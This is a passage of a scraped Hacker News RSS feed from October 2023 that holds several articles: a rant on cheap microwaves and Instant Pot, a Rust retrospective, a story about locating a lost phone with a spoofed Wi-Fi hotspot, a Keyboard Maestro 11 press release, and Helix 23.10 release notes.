Berlin, Germany, Jina AI is at the vanguard of reshaping the landscape of multimodal artificial intelligence. For inquiries, please reach out at <a><span data-cfemail="a6c5c9c8d2c7c5d2e6cccfc8c788c7cf">[email&nbsp;protected]</span></a>.</p></section></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why every microwave sucks these days (134 pts)]]></title>
            <link>https://moth.monster/blog/microwaves/</link>
            <guid>38019383</guid>
            <pubDate>Wed, 25 Oct 2023 22:53:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://moth.monster/blog/microwaves/">https://moth.monster/blog/microwaves/</a>, See on <a href="https://news.ycombinator.com/item?id=38019383">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<main>
			<article>
				<header>
					
					<h2>and the death of instant pot</h2>
					<time datetime="2023-10-24">oct 24 2023</time>
					<hr>
				</header>
				
				<p>
					have you bought a microwave recently?
				</p>
				<p>
					if you're lucky, you haven't. you're still using a microwave from the 1990's or something like that, and it still works just fine. after all, how can a microwave be made any better? you put stuff in, and the water in the stuff heats up. there really isn't much innovation to be done that wasn't already done half a century ago.
				</p>
				<p>
					there is no growth to be had in selling microwaves. nobody is rushing out to buy the hot new microwave. there is no TikTok trending microwave with revolutionary new smart features. the only reason anyone would ever consider buying a microwave is because they moved into a new place that didn't already have one, or their old one broke. you probably don't even look at what the box says, because they're all the same, and they all have that "popcorn" button which doesn't work for some reason.
				</p>
				<p>
					it turns out, however, that things have not always been this way. back before everyone owned a microwave, there was actual development and competition that led to microwaves getting better. the only really useful feature was the addition of a moisture sensor, which allowed it to actually pop popcorn automatically without burning it, or defrost things without cooking them, or perfectly bake a potato.
				</p>
				<p>
					however, as the 2000s rolled along, a problem occurred. you see, everyone had a microwave, and there was no way to make one that was actually better than their old one. this meant that nobody had a reason to buy a microwave anymore. if everyone suddenly no longer needs to buy your product, your company has a big problem. of course, very few companies would sell only a microwave and nothing else. most companies just focused on other hot new electronic gadgets. still, having a microwave on offer was nice, so they just contracted out to someone else to make those microwaves, and slapped their name on the box at the end.
				</p>
				<p id="note-1-return">
					after a decade of this, there was only one company left making microwaves. this company, Midea, doesn't really sell microwaves under their own name, because all of them suck. they only slap their name onto actually good products, because they don't want to be tied to how absolutely dogshit their microwaves are. they work fine at first, but break after a year or so of normal usage, and are designed to be completely unrepairable to stop idiots from electrocuting themselves on the high voltage transformers inside.<sup><a href="#note-1">1</a></sup>
				</p>
				<p>
					somewhere along the line of all this margin squeezing, someone had the idea to get rid of the moisture sensor from the cheap models. but instead of removing the now-useless popcorn and potato buttons, they just left the buttons on there, and made them kinda half work. of course, they don't work very well. you can usually find if a microwave has a sensor because it will brag about it on the box. this is the only feature that defines the cheapest Midea microwaves from the slightly less cheap ones. but they're all cheap and they all suck.
				</p>
				<p id="note-2-return">
					what can we learn from this? i don't know. capitalism will destroy everything it touches. there are only three<sup><a href="#note-2">2</a></sup> models of microwave in the entire world and all of them suck ass. just go live in the woods and eat moss or something.
				</p>
				<hr id="multicooker-madness">
				<p>
					much like the microwave, the multicooker was invented earlier than you might have thought. in fact, the earliest multicookers were invented a whole century ago, promoted in the U.K. as a way to use newfangled electricity to cook, instead of old fashioned — and expensive to run — gas stoves.
				</p>
				<p>
					perhaps the most famous modern multicooker, the Instant Pot, was first released in 2010. it could replace a slow cooker, pressure cooker, and rice cooker, all in a single package. it could even act as a hot plate or steamer if you didn't have a stove handy. the company never marketed much, but slowly gained traction through word-of-mouth and online recipe groups. some even likened the fans of it to a sort of cult, due to their sheer devotion to the product. nowhere left to go but up, right?
				</p>
				<p>
					but while 1920 marked the start of the multicooker, it was not until 2020 that the multicooker truly became a global phenomenon. the COVID-19 pandemic led to a whole lot of people being stuck at home, wanting a more convenient way to cook. basically every household in the world ended up with an Instant Pot or one of the many similar products available from other companies.
				</p>
				<p>
					notice something familiar happening?
				</p>
				<p>
					in 2023, Instant Brands, the company that owned the Instant Pot brand along with some other brands of kitchen products filed for bankruptcy. they couldn't keep up with all the debt they'd picked up while growing, and the growth suddenly stopped. everyone had a multicooker, so there was nobody left to sell one to. and since the product was simple and durable without any consumable parts, there was no more money left to be made. it was simply too good of a product to survive.
				</p>
				<p>
					because Instant Brands had no other hot new products to lean onto, they were well and truly screwed. infinite growth simply can't last if you have a finite amount of people in the world to buy them. eventually, the cancer kills its host.
				</p>
				<p>
					while it's likely that the Instant Pot brand will survive, it's also likely that the quality of these multicookers as a product category will start to sharply fall in the coming years, just as microwaves did in the 2000's. Midea also happens to supply them as well; it's only a matter of time before the right costs are cut to ensure a product which barely lasts past the end of the warranty period.
				</p>
				<hr>
				<p id="note-1">
					<a href="#note-1-return">1.</a> don't play with microwave transformers. they're one of the most common things to kill electronics hobbyists, because they're super dangerous and really easy to get. and if you ignore this warning, remember to add a dead man's switch so you don't hurt the people who find your electrocuted body.
				</p>
				<p id="note-2">
					<a href="#note-2-return">2.</a> Panasonic still makes some of their own microwaves, actually. they also cost a ton of money and still break quickly, but at least they use less electricity before they break?
				</p>
			</article>
		</main>
		
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Was Rust Worth It? (392 pts)]]></title>
            <link>https://jsoverson.medium.com/was-rust-worth-it-f43d171fb1b3</link>
            <guid>38019231</guid>
            <pubDate>Wed, 25 Oct 2023 22:37:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jsoverson.medium.com/was-rust-worth-it-f43d171fb1b3">https://jsoverson.medium.com/was-rust-worth-it-f43d171fb1b3</a>, See on <a href="https://news.ycombinator.com/item?id=38019231">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><figure><figcaption>An unsure crab</figcaption></figure><div><h2 id="ade7">From JavaScript to Rust, three years in.</h2><div><a rel="noopener follow" href="https://jsoverson.medium.com/?source=post_page-----f43d171fb1b3--------------------------------"><div aria-hidden="false"><p><img alt="Jarrod Overson" src="https://miro.medium.com/v2/resize:fill:88:88/1*DUjBSZ8vCnqtthWwHubL9A.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a></div></div><p id="b39c">A few years ago, I dropped everything to focus 100% on WebAssembly. At the time, Rust had the best support for compiling into WebAssembly, and the most full-featured WebAssembly runtimes were Rust-based. Rust was the best option on the menu. I jumped in, eager to see what all the hype was about.</p><p id="b755">Since then, I (along with some other awesome people) built <a href="https://github.com/candlecorp/wick" rel="noopener ugc nofollow" target="_blank">Wick</a>, an application framework and runtime that uses WebAssembly as its core module system.</p><figure><figcaption>Wick was the primary target of our Rust experimentation</figcaption></figure><p id="6fee">After three years, multiple production deployments, an <a href="https://github.com/jsoverson/node-to-rust" rel="noopener ugc nofollow" target="_blank">ebook</a>, and ~100 packages deployed on <a href="https://crates.io/me/crates" rel="noopener ugc nofollow" target="_blank">crates.io</a>, I feel it’s time to share some thoughts on Rust.</p><h2 id="7ba4">The Good</h2><h2 id="0854">You can maintain more with less</h2><p id="9c68">I am a massive proponent of test-driven development. I got used to testing in languages like Java and JavaScript. I started writing tests in Rust as I would in any other language but found that I was writing tests that <em>couldn’t fail</em>. Once you get to the point where your tests can run – that is, where your Rust code compiles – Rust has accounted for so many errors that many common test cases become irrelevant. If you avoid <code>unsafe {}</code> blocks and panic-prone methods like <code>.unwrap()</code>, you start with a foundation that sidesteps many problems by default.</p><p id="468a">The aggressiveness of Rust’s borrow checker, the richness of Rust’s type system, the functional patterns and libraries, and the lack of “null” values all lead to maintaining more with less effort spent in places like testing. I’ve maintained the 70,000+ lines of code in the Wick project with far fewer tests than I would need in other languages.</p><p id="cde4">When you need to write tests, adding them on the fly is easy without thinking about it. Rust’s integrated test harness lets you add tests right next to code with barely a second thought.</p><h2 id="29a1">I code better in other languages now</h2><p id="7b0c">Programming in Rust is like being in an emotionally abusive relationship. Rust screams at you all day, every day, often about things that you would have considered perfectly normal in another life. Eventually, you get used to the tantrums. They become routine. You learn to walk the tightrope to avoid triggering the compiler’s temper. And just like in real life, those behavior changes stick with you forever.</p><p id="d05f">Emotional abuse is not generally considered a <em>healthy</em> way to encourage change, but it does effect change nonetheless.</p><p id="c7a0">I can’t write code in other languages without feeling uncomfortable when lines are out of order or when return values are unchecked. I also now get irrationally upset when I experience a runtime error.</p><figure><figcaption><em>What do you mean “</em><code><em>done"</em></code><em> is not a function? Why didn’t you let me know "</em><code><em>done”</em></code><em> might not be a function??</em></figcaption></figure><h2 id="133d">Clippy is great!</h2><p id="f0cc"><a href="https://github.com/rust-lang/rust-clippy" rel="noopener ugc nofollow" target="_blank">Clippy</a> is Rust’s linter, but calling it a linter is a disservice. In a language where the compiler can make you cry, Clippy is more of a gentle friend than a linter.</p><p id="aed8">The Rust standard library is <em>enormous.</em> It’s hard to find functions you know probably exist when so much functionality is spread across myriad granular types, traits, macros, and functions. Many Clippy rules (e.g., <code><a href="https://rust-lang.github.io/rust-clippy/master/index.html#/manual_is_ascii_check" rel="noopener ugc nofollow" target="_blank">manual_is_ascii_check</a></code>) look for common patterns that stdlib methods or types would better replace.</p><p id="b1cb">Clippy has <a href="https://rust-lang.github.io/rust-clippy/master/index.html" rel="noopener ugc nofollow" target="_blank">hundreds of rules</a> that tackle performance, readability, and unnecessary indirection. It will frequently give you the replacement code when possible.</p><p id="fd27">It also looks like (soon) you’ll <a href="https://github.com/rust-lang/cargo/issues/12115" rel="noopener ugc nofollow" target="_blank">finally</a> be able to configure global lints for a project. Until now, you had to hack your solution to keep lints consistent for projects. In Wick, we use a script to automatically update <a href="https://github.com/candlecorp/wick/blob/main/src/main.rs#L8-L84" rel="noopener ugc nofollow" target="_blank">inline lint configurations</a> for a few dozen crates. It took <a href="https://github.com/rust-lang/cargo/issues/5034" rel="noopener ugc nofollow" target="_blank"><em>years</em></a> for the Rust community to land on a solution for this, which brings us to…</p><h2 id="9fdb">The Bad</h2><h2 id="8a7c">There are gaps that you’ll have to live with</h2><p id="764a">I questioned my sanity every time I circled back around to the Clippy issue above. Surely, I was wrong. There must be a configuration I missed. I couldn’t believe it. I still can’t. Surely there must be a way to configure lints globally. I <a href="https://github.com/rust-lang/cargo/issues/5034" rel="noopener ugc nofollow" target="_blank">quadruple</a>-<a href="https://github.com/rust-lang/rust/issues/45832" rel="noopener ugc nofollow" target="_blank">checked</a> <a href="https://github.com/rust-lang/rust-clippy/issues/1313" rel="noopener ugc nofollow" target="_blank">when</a> I <a href="https://github.com/rust-lang/rust-clippy/issues/6625" rel="noopener ugc nofollow" target="_blank">wrote</a> <a href="https://www.appsloveworld.com/rust/4/how-can-i-have-a-shared-clippy-configuration-for-all-the-crates-in-a-workspace" rel="noopener ugc nofollow" target="_blank">this</a> <a href="https://github.com/EmbarkStudios/rust-ecosystem/issues/22" rel="noopener ugc nofollow" target="_blank">to</a> make sure I wasn’t delusional. Those issues are closed now, but they had been open for years.</p><p id="a078">Clippy’s awesome, but this use case is one example of many around the Rust world. I frequently come across libraries or tools where my use cases aren’t covered. That’s not uncommon in newer languages or projects. Software takes time (usage) to mature. But Rust isn’t <em>that</em> new. There’s something about Rust that feels different.</p><p id="8970">In open source, edge cases are frequently addressed by early adopters and new users. They’re the ones with the edge cases. Their PRs refine projects so they’re better for the next user. <a href="https://github.blog/2023-08-30-why-rust-is-the-most-admired-language-among-developers/" rel="noopener ugc nofollow" target="_blank">Rust has been awarded the “most loved language” for the better part of a decade</a>. It’s got no problem attracting new users, but it’s not resulting in dramatically improved libraries or tools. It’s resulting in one-off forks that handle specific use cases. I’m guilty of that, too, but not for lack of trying to land PRs.</p><p id="79b6">I don’t know why. Maybe the pressure to maintain stable APIs, along with Rust’s granular type system, makes it difficult for library owners to iterate. It’s hard to accept a minor change if it would result in a major version bump.</p><p id="674c">Or maybe it’s because writing Rust code that does everything for everyone is exceedingly difficult, and people don’t want to deal with it.</p><h2 id="e6f5">Cargo, crates.io, and how to structure projects</h2><p id="d7d1">I modeled the Wick repository structure around some other popular projects I saw. It looked reasonable and worked fine until it didn’t.</p><p id="e84b">You can build, test, and use what feels like a module-sized crate easily with Cargo. Deploying it to crates.io, though? That’s a whole different story.</p><p id="4893">You can’t publish packages to crates.io unless <strong>every</strong> referenced crate is also published individually. That makes some sense. You don’t want to depend on a crate that depends on packages that only exist on the author’s local filesystem.</p><p id="2591">However, many developers break large projects down into smaller modules naturally, and you can’t publish a parent crate that has sub-crates that <em>only exist within itself. </em>You can’t even publish a crate that has local dev dependencies. You must choose between publishing random utility crates or restructuring your project to avoid this problem. This limitation feels arbitrary and unnecessary. You can clearly build projects structured like this, you just can’t publish them.</p><p id="b0d9">Cargo does have excellent workspace support, though! Cargo’s workspaces offer a better experience managing large projects than most languages. But they don’t solve the deployment problem. Turns out, you can set workspaces up in any of a dozen ways, <em>none</em> of which make it easy to deploy.</p><p id="5bd0">You can see the problem manifest in the sheer number of <a href="https://crates.io/search?q=cargo+workspace+publish" rel="noopener ugc nofollow" target="_blank">utility crates</a> designed to simplify publishing workspaces. Each works with a subset of configurations, and the “one true way” of setting workspaces up still eludes me. When I publish Wick, it’s frequently an hour+ of effort combining manual, repetitive tasks with tools that only partially work.</p><h2 id="8ab7">Async</h2><p id="b1a0">Rust added async-iness to the language after its inception. It feels like an afterthought, acts like an afterthought, and frequently gets in your way with errors that are hard to understand and resolve. When you search for solutions, you have to filter based on the various runtimes and their async flavors. Want to use an async library? There’s a chance you can’t use it outside of a specific async runtime.</p><p id="ba1a">After two decades of JavaScript and decent experience with Go, this is the <em>most significant </em>source of frustration and friction with Rust. It’s not an insurmountable problem, but you must always be ready to deal with the async monster when it rears its head. In other languages, async is almost invisible.</p><h2 id="14b4">The Ugly</h2><h2 id="c70d">Refactoring can be a slog</h2><p id="64a2">Rust’s rich type system is a blessing and a curse. Thinking in Rust types is a dream. Managing Rust’s types can be a nightmare. Your data and function signatures can have generic types, generic lifetimes, and trait constraints. Those constraints can have their own generic types and lifetimes. <a href="https://github.com/rxRust/rxRust/blob/master/src/observable.rs#L1134-L1142" rel="noopener ugc nofollow" target="_blank">Sometimes, you’ll have more type constraints than actual code</a>.</p><figure><figcaption>Constraints that outweigh logic</figcaption></figure><p id="79ea">You also need to define all your generics on <a href="https://github.com/bytecodealliance/wasmtime/blob/038ddfeb6699591b5d82546c9b2d5076097bc9ce/cranelift/entity/src/iter.rs#L29-L58" rel="noopener ugc nofollow" target="_blank">every </a><code><a href="https://github.com/bytecodealliance/wasmtime/blob/038ddfeb6699591b5d82546c9b2d5076097bc9ce/cranelift/entity/src/iter.rs#L29-L58" rel="noopener ugc nofollow" target="_blank">impl</a></code>. It’s tedious when writing it the first time. When refactoring though, it can turn a minor change into a cascading mess.</p><figure><figcaption>Simple generic IDs are duplicated over and over again.</figcaption></figure><p id="c24a">It’s hard to make rapid progress when you need to tweak 14 different definitions before you can take a single step forward.</p><h2 id="32dd">The Verdict</h2><p id="be53">I love Rust. I love what it can do and how versatile it is. I can write system-level code in the same language as CLI apps, web servers, <em>and</em> web clients. With WebAssembly, I can use the same exact binary to run an LLM <a href="https://wasm.candle.dev/llama2" rel="noopener ugc nofollow" target="_blank">in the browser</a> as on the command line. That still blows my mind.</p><p id="715e">I love how rock-solid Rust programs can be. It’s hard to return to other languages after you learn to appreciate what Rust protects you from. I went back to Go for a brief period. I quickly became intoxicated with the speed of development again. Then I hit the runtime panics, and the glass shattered.</p><p id="9526">But Rust has its warts. It’s hard to hire for, slow to learn, and too rigid to iterate quickly. It’s hard to troubleshoot memory and performance issues, especially with async code. Not all libraries are as good about safe code as others, and dev tooling leaves much to be desired. You start behind and have a lot working against you. If you can get past the hurdles, you’ll leave everyone in the dust. That’s a big if.</p><p id="39d7">Was Rust worth it for us? It’s too early to tell. We’ve done amazing things with a small team but also had immense roadblocks. We also had technical reasons that made Rust more viable.</p><p id="75ff">Will it be worth it for you? If you need to iterate rapidly, probably not. If you have a known scope, or can absorb more upfront cost? Definitely consider it. You’ll end up with bulletproof software. With the WebAssembly angle becoming stronger every month, the prospect of writing perfect software <em>once</em> and reusing it <em>everywhere</em> is becoming a reality sooner rather than later.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to find a lost phone in a no-cell-coverage camping site? (357 pts)]]></title>
            <link>https://manas.tech/blog/2023/10/25/approaching-unconventional-problems/</link>
            <guid>38018917</guid>
            <pubDate>Wed, 25 Oct 2023 21:58:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://manas.tech/blog/2023/10/25/approaching-unconventional-problems/">https://manas.tech/blog/2023/10/25/approaching-unconventional-problems/</a>, See on <a href="https://news.ycombinator.com/item?id=38018917">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <p><h3>Or <em>"How to find a lost phone in a no-cell-coverage camping site?"</em></h3></p><p>A few weeks ago, I went on a trip with my dad, uncle, cousin and a couple of their friends in order to share an off-road trip on ATVs across the jungle. There were about twelve of us enjoying the landscape in Misiones, northern Argentina, with its tea, tobacco and yerba mate plantings. Not that you could expect to see lots of wild animals around those noisy ATVs.</p><div> <center><div> <div> <picture><source srcset="https://manas.tech/images/uploads/2023/10/misiones-atvs.webp" type="image/webp"><img src="https://manas.tech/images/uploads/2023/10/misiones-atvs.jpg" loading="lazy"></picture> </div> <p> Ready... set... go! </p> </div> </center> </div><p>Largely beautiful as this country is, as you get into more rural areas, there's a high chance you won't have cell phone coverage there - I'll leave it as an exercise to the reader to choose if that's a feature or a bug.</p><p>So there we were, making an <em>asado</em> (think "barbeque", if you must) in the cabins we've rented in the middle of nowhere, when my cousin started to look around for his phone. In the hour after the last time we knew he had the phone, he took a 50km trip to the closest town to shop for some fuel and beverages - so we really hoped he didn't lose the phone there. We'd already called and sent some WhatsApp messages, so we knew the phone wasn't reachable. So we checked the area around the grill, we checked the cabins, we checked around the place where we were playing some cards (yes, it had to be Truco), we checked in the truck in which he went to the town - all to no avail.</p><p>Using the “Find my device” feature of the phone wasn’t really an option, since there was no way the signal was going to reach the phone. So... was there anything else to try?</p><div> <center><div> <div> <picture><source srcset="https://manas.tech/images/uploads/2023/10/butterfly-number-88.webp" type="image/webp"><img src="https://manas.tech/images/uploads/2023/10/butterfly-number-88.jpg" loading="lazy"></picture> </div> <p> There were lots of butterflies around - but I think the pattern on this one is not actually a serial number. </p> </div> </center> </div><p>It turns out - there was.</p><p>After having lived in a rural area for almost two years, I’ve learnt to save battery by switching my phone’s wifi off whenever I go into the woods or mountain - but I also know that people don’t usually do that. After confirming this assumption with him, I’ve used my own phone’s tethering feature to create a wifi network with the same name &amp; password as my cousin’s home network - and we started walking around the place. We made sure the other guy helping us with the search had his own wifi off, to avoid false positives, and waited to find a new connection to the hotspot. And it worked! The connection was made when walking nearby the parked truck, but it turns out that the phone wasn’t in the truck - it was lying on one of the ATVs that was parked by its side.</p><p>Should we not have found it so “soon” with this strategy, we would have started walking in different ways from that zone to try to triangulate the signal - but we were lucky to not need that.</p><p>There’s that nice feeling in being able to combine your techie knowledge and the lessons learnt from constrained environments just for fun - double that when it helps to help someone solve a real problem.</p><div> <center><div> <div> <picture><source srcset="https://manas.tech/images/uploads/2023/10/misiones-sunset.webp" type="image/webp"><img src="https://manas.tech/images/uploads/2023/10/misiones-sunset.jpg" loading="lazy"></picture> </div> <p> Any time is a good time to enjoy a nice sunset - but more specifically right after the afternoon. </p> </div> </center> </div>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Keyboard Maestro 11 (188 pts)]]></title>
            <link>https://www.stairways.com/press/2023-10-24</link>
            <guid>38017831</guid>
            <pubDate>Wed, 25 Oct 2023 20:22:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.stairways.com/press/2023-10-24">https://www.stairways.com/press/2023-10-24</a>, See on <a href="https://news.ycombinator.com/item?id=38017831">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="ContentWrapper">
<h2>Press Release for 24 Oct 2023</h2><h2>Stairways Software releases Keyboard Maestro 11</h2>

<p>Perth, Western Australia - 24 Oct 2023 - Stairways Software Pty Ltd is pleased to announce Keyboard Maestro 11.0, the new version of its powerful productivity enhancer for macOS.  </p>
<p>Version 11 extends the editor by adding a New Macro Wizard and new Security preference pane, and enhanced searching and syncing.</p>
<p>The engine adds a new keyboardmaestro command line tool for triggering macros, modern JavaScript syntax, Apple Text Recognition option, a new palette to show active macro groups, enhanced scripting support, and more.</p>
<p>There is a new Space Changed trigger, and new trigger options for hot keys and device keys. Version 11 also adds support for using modifier taps in Typed String triggers.</p>
<p>There are lots of new actions including Prompt for Snippet, Create Calendar Event, Send Pushover Notification, Set Screen Resolution, Select Menu by Name, Remove Clipboard Flavors, Set Audio Device, Mute Audio Device, Get Location and more.</p>
<p>There are also lots of new options to existing actions, such as waiting for an image to appear and then clicking on it, more actions with progress bars, more options for pressing buttons and finding buttons in application windows, and many more.</p>
<p>There are a whole bunch of new tokens and functions for getting information about web browsers, document paths, application versions, screen resolutions, audio devices, clipboard flavors, and system information.</p>
<p>Plus there are new conditions and new filters and a bunch of minor tweaks and fixes.</p>
<p>Keyboard Maestro 11.x requires macOS 10.13 High Sierra or later, and has a Hardened Runtime and is Notarized, and is native for Intel 64 bit and Apple Silicon.</p>
<p>Keyboard Maestro is engineered by Stairways Software Pty Ltd and distributed by FastSpring. Keyboard Maestro is licensed on a per user basis, and an individual user can use it on up to five Macs.</p>
<p>New customers can purchase Keyboard Maestro from &lt;<a href="https://purchase.keyboardmaestro.com/">https://purchase.keyboardmaestro.com/</a>&gt; for US$36*.  Customers with ten or more users should contact us for a volume discount quote.</p>
<p>Customers who purchased Keyboard Maestro directly from us after March 1, 2023 have been issued a free upgrade to Keyboard Maestro 11.  If you have not received your free license, you can find your free license upgrade at &lt;<a href="https://enquiry.stairways.com/">https://enquiry.stairways.com/</a>&gt;.</p>
<p>Customers who purchased a prior version of Keyboard Maestro before March 1, 2023 can upgrade to Keyboard Maestro 11 for US$25*.  Until December 15, 2023, customers who purchased Keyboard Maestro version 10 before March 1, 2023 can upgrade for the discounted price of US$18*.  Customers will be emailed instructions on upgrading, but if you have not received your instructions on how to upgrade, you can find details by looking up your Keyboard_Maestro license at &lt;<a href="https://enquiry.stairways.com/">https://enquiry.stairways.com/</a>&gt;.</p>
<p>Keyboard Maestro 11 is not available from the Mac App Store and probably never will be.</p>
<p>A fully-functional unlicensed trial version of Keyboard Maestro can be downloaded from &lt;<a href="https://download.keyboardmaestro.com/">https://download.keyboardmaestro.com/</a>&gt;.</p>
<p>For sales enquires, volume purchases, customer service, technical support, or to contact project management, our current contact information is listed at &lt;<a href="https://contact.stairways.com/">https://contact.stairways.com/</a>&gt;.</p>
<p>Extensive online documentation on Keyboard Maestro can be found at &lt;<a href="https://documentation.keyboardmaestro.com/">https://documentation.keyboardmaestro.com/</a>&gt; and on the wiki at &lt;<a href="https://wiki.keyboardmaestro.com/">https://wiki.keyboardmaestro.com</a>&gt; and the very active and very helpful forum at &lt;<a href="https://forum.keyboardmaestro.com/">https://forum.keyboardmaestro.com</a>&gt;.</p>
<p>A brief taste of Keyboard Maestro in action can be found at &lt;<a href="https://screenshots.keyboardmaestro.com/">https://screenshots.keyboardmaestro.com/</a>&gt;, and for a complete list of What's New, see the wiki page at &lt;<a href="https://wiki.keyboardmaestro.com/manual/Whats_New">https://wiki.keyboardmaestro.com/manual/Whats_New</a>&gt;</p>
<p>For more information about anything to do with Keyboard Maestro visit &lt;<a href="https://www.keyboardmaestro.com/">https://www.keyboardmaestro.com/</a>&gt;.</p>
<p>*costs are per user (on up to five Macs), for the current major version, in US$, plus applicable taxes.  There is no subscription fee.</p>

<p><a href="https://www.stairways.com/press/2022-09-06">Previous Press Release</a>&nbsp;&nbsp;&nbsp;</p></div><p>
© 1990 - 2023 Stairways Software Pty Ltd. All rights reserved.
</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Helix 23.10 Highlights (146 pts)]]></title>
            <link>https://helix-editor.com/news/release-23-10-highlights/</link>
            <guid>38017541</guid>
            <pubDate>Wed, 25 Oct 2023 20:02:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://helix-editor.com/news/release-23-10-highlights/">https://helix-editor.com/news/release-23-10-highlights/</a>, See on <a href="https://news.ycombinator.com/item?id=38017541">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        

 <h2>Release 23.10 Highlights</h2>
 <time>25 October 2023</time>

<p>The Helix 23.10 release is finally here! 23.10 introduces some very large
internal changes that enable some powerful features. A very big <em>thank you</em> to
everyone who made this release possible.</p>
<p>New to Helix?
Helix is a modal text editor with built-in support for multiple selections,
Language Server Protocol (LSP), tree-sitter, and experimental support for Debug
Adapter Protocol (DAP).</p>
<p>Let's check out this release's highlights.</p>
<h2 id="multiple-language-servers">Multiple language servers</h2>
<p>23.10 brings a big change to the way we handle language servers.
Previously each language could only support one language server at a time but
now you can configure multiple to work in tandem. For example you might use
the TypeScript language server for JavaScript/TypeScript development and also
configure <a href="https://github.com/mattn/efm-langserver">efm-langserver</a> for
Prettier formatting and ESLint diagnostics. With the new support for multiple
language servers, you can specify which features to use from each language
server.</p>
<p>This brings a big change to the way language servers are configured in your
language configuration (<code>languages.toml</code>). All language servers are now
specified separately from languages and then each language selects which
language server(s) to use. From the example above, you might configure efm-
langserver and typescript-language-server like so:</p>
<pre data-lang="toml"><code data-lang="toml"><span>[language-server.efm]
</span><span>command </span><span>= "</span><span>efm-langserver</span><span>"
</span><span>config</span><span>.</span><span>documentFormatting </span><span>= </span><span>true
</span><span>
</span><span>[language-server.typescript-language-server]
</span><span>command </span><span>= "</span><span>typescript-language-server</span><span>"
</span><span>args </span><span>= ["</span><span>--stdio</span><span>"]
</span><span>config</span><span>.</span><span>hostInfo </span><span>= "</span><span>helix</span><span>"
</span><span>
</span><span>[[language]]
</span><span>name </span><span>= "</span><span>typescript</span><span>"
</span><span>auto-format </span><span>= </span><span>true
</span><span>language-servers </span><span>= [
</span><span>  { </span><span>name </span><span>= "</span><span>efm</span><span>", </span><span>only-features </span><span>= ["</span><span>format</span><span>", "</span><span>diagnostics</span><span>"] },
</span><span>  { </span><span>name </span><span>= "</span><span>typescript-language-server</span><span>", </span><span>except-features </span><span>= ["</span><span>format</span><span>", "</span><span>diagnostics</span><span>"] },
</span><span>]
</span></code></pre>
<p>See more details in the <a href="https://docs.helix-editor.com/languages.html">language configuration docs</a>.</p>
<h2 id="fuzzy-matching-with-nucleo">Fuzzy matching with Nucleo</h2>
<asciinema-player src="/nucleo-nix-store.cast" cols="94" rows="25"></asciinema-player>
<p>Helix uses "fuzzy" matching to filter as-you-type in components like the file
picker. Previously we used the popular <code>skim</code>/<code>fuzzy-matcher</code> crates but in the
23.10 release we've switched to the new
<a href="https://github.com/helix-editor/helix"><code>nucleo</code></a> crate. Nucleo is
significantly faster than skim and fzf, handles Unicode correctly, and uses a
bonus system that feels more intuitive.</p>
<p>Nucleo also enables us to lazily stream in new items, which is a big boost for
the user experience for pickers. In the asciicast above I'm scanning through
my computer's <code>/nix/store</code>, a huge directory containing more than twenty
million files. The file picker now works gradually as we scan through the
directory and matches files as we find them.</p>
<p>Nucleo also paves the way for future picker upgrades. Stay tuned to the
upcoming release notes to see where we'll take the picker.</p>
<h2 id="smart-tab">Smart tab</h2>
<p>Smart tab is a new feature bound to the tab key in the default keymap. When
you press tab and the line to the left of the cursor isn't all whitespace,
the cursor will jump to the end of the syntax tree's parent node. For example:</p>
<pre data-lang="nix"><code data-lang="nix"><span>{
</span><span>  </span><span>key </span><span>= "</span><span>value</span><span>";
</span><span>  </span><span>nested </span><span>= {
</span><span>    </span><span>key2 </span><span>= "</span><span>value2</span><span>"; </span><span># When the cursor is at the end of the line here, &lt;tab&gt;
</span><span>                     </span><span># jumps right after the closing brace on the next line.
</span><span>  };
</span><span>}
</span></code></pre>
<p>This is useful in languages like Nix for adding semicolons at the end of an
attribute set or jumping to the end of a block in a C-like language:</p>
<asciinema-player src="/smart-tab.cast" cols="94" rows="25"></asciinema-player>
<h2 id="expanded-support-for-registers">Expanded support for registers</h2>
<asciinema-player src="/special-registers.cast" cols="94" rows="25"></asciinema-player>
<p>Registers allow you to save and paste values. For example you might select
a paragraph, use <code>"ay</code> to yank it into the <code>a</code> register, and later use <code>"ap</code>
to paste that paragraph. Some registers have special effects when read or
written to though like the <code>_</code> "blackhole" register: any values written are
discarded and nothing can be read. Special registers have been expanded to
include some useful ones from Kakoune and clipboard registers:</p>
<ul>
<li><code>%</code>: the current buffer name</li>
<li><code>#</code>: the number of each selection, 1-indexed</li>
<li><code>.</code>: the contents of each selection</li>
<li><code>*</code> and <code>+</code>: system and primary clipboards</li>
</ul>
<p>Also check out the new register statusline element. It appears when you select
a register with <code>"</code>. Notice the <code>reg=#</code> in the bottom-right corner of the
statusline in the asciicast when we select the <code>#</code> register and how it goes
away when we paste that register (<code>p</code>) or increment the selections (<code>C-a</code>).</p>
<h2 id="initial-support-for-lsp-didchangewatchedfiles">Initial support for LSP DidChangeWatchedFiles</h2>
<asciinema-player src="/initial-lsp-didchangewatchedfiles.cast" cols="94" rows="25"></asciinema-player>
<p>Some language servers use the DidChangeWatchedFiles notification to discover
changes to related files in other languages. For example, <code>rust-analyzer</code> will
fetch and index new dependencies when you add them to your <code>Cargo.toml</code>.
Helix will now send file change notifications when the file is changed by
Helix itself. Full support for DidChangeWatchedFiles will require a file
watcher but for now we're able to support the most common use-case for
DidChangeWatchedFiles.</p>
<h2 id="syntax-highlight-regex-prompts">Syntax highlight regex prompts</h2>
<img src="https://helix-editor.com/regex-prompt-highlighting.png">
<p>Regex prompts like those created with <code>s</code>, <code>S</code> or <code>|</code> are now syntax highlighted
via tree-sitter-regex. The highlighting makes special characters more obvious
and can catch syntax errors like trailing backslashes.</p>
<h2 id="wrapping-up">Wrapping up</h2>
<p>As always, this is just the tip of the iceberg for the 23.10 release. Check out
